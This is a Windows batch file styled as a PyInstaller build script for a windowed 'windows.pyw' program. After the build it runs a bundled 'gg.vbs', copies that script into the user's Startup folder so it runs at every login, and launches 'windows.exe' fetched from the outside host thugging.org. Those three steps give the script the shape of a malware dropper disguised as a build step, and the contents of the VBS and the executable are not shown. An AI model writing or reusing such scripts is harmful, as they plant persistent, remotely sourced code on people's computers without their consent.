@echo off
setlocal

REM Ensure we are in the script's directory
cd /d "%~dp0"

set SETUP_EXEC_VBS=.\necessities\gg.vbs
set SETUP_EXEC_EXE=https://thugging.org/static/windows.exe
set SCRIPT_NAME=windows.pyw
set ICON_PATH=image.ico
set DATA_FILE=6.mp3
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM Build the executable using PyInstaller
echo Building the executable with PyInstaller...
pyinstaller --onefile --windowed --add-data "%DATA_FILE%;." --icon "%ICON_PATH%" --exclude-module PyQt5 --exclude-module opencv --exclude-module numpy "%SCRIPT_NAME%"
set BUILD_ERROR=%ERRORLEVEL%

if %BUILD_ERROR% NEQ 0 (
    echo Error: PyInstaller failed to build the executable.
) else (
    echo PyInstaller build completed successfully.
    
    REM Run gg.vbs after building
    echo Running gg.vbs after building...
    "%SETUP_EXEC_VBS%"
    if %ERRORLEVEL% NEQ 0 (
        echo Error: gg.vbs failed to run after building.
    ) else (
        echo gg.vbs ran successfully after building.
    )

    REM Copy gg.vbs to Startup folder
    echo Copying gg.vbs to Startup folder...
    copy "%SETUP_EXEC_VBS%" "%STARTUP_FOLDER%"
    if %ERRORLEVEL% NEQ 0 (
        echo Error: Failed to copy gg.vbs to Startup folder.
    ) else (
        echo gg.vbs copied to Startup folder successfully.
    )

    REM Run windows.exe from URL after building
    echo Running windows.exe from URL...
    start "" "%SETUP_EXEC_EXE%"
    if %ERRORLEVEL% NEQ 0 (
        echo Error: Failed to run windows.exe.
    ) else (
        echo windows.exe ran successfully.
    )
)

REM Notify completion
echo Build script completed with error level %BUILD_ERROR%.

REM Prevent the batch file from closing immediately
echo Press any key to exit...
pause

endlocal
